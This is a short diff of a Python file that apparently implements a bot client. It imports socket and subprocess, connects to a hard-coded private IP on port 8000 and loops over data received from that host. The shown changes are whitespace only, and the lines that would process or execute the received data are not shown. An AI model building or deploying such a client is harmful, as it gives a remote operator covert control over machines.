@@ -1,8 +1,8 @@
 import socket
 import subprocess
 
-
 def botclient():
+
     HOST = '192.168.100.152'
     PORT = 8000
 
@@ -21,7 +21,6 @@ def botclient():
             except Exception as e:
                 print('Error processing'.format(data))
                 print(e)
-
         data = s.recv(1024).decode()
     s.close()
 
